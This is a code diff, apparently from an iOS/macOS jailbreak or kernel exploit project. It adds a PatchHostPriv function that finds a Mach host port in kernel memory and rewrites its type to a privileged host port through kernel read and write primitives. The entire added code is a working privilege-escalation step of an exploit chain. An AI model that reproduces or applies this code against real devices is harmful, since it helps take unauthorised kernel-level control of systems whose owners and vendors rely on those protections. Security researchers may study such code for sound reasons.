@@ -552,3 +552,23 @@ void HexDump(uint64_t addr, size_t size) {
     }
     free(data);
 }
+
+BOOL PatchHostPriv(mach_port_t host) {
+
+#define IO_ACTIVE 0x80000000
+#define IKOT_HOST_PRIV 4
+    
+    // locate port in kernel
+    uint64_t host_kaddr = FindPortAddress(host);
+    
+    // change port host type
+    uint32_t old = KernelRead_32bits(host_kaddr + 0x0);
+    printf("[-] Old host type: 0x%x\n", old);
+    
+    KernelWrite_32bits(host_kaddr + 0x0, IO_ACTIVE | IKOT_HOST_PRIV);
+    
+    uint32_t new = KernelRead_32bits(host_kaddr);
+    printf("[-] New host type: 0x%x\n", new);
+    
+    return ((IO_ACTIVE | IKOT_HOST_PRIV) == new) ? YES : NO;
+}
